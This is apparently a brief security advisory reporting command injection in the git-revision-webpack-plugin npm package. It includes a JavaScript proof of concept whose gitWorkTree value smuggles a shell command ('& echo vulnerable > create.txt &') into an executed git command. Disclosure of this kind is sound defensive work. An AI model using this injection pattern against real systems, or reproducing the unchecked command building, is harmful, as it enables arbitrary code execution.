
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept 

```js
// poc.js
var Root = require("git-revision-webpack-plugin"); 
var opt = { "gitWorkTree": "& echo vulnerable > create.txt &" } 
var root = new Root(opt); root.commithash();
```
## References:

- [GitHub Permalink #1](https://github.com/pirelenito/git-revision-webpack-plugin/blob/master/lib/helpers/run-git-command.js#L25)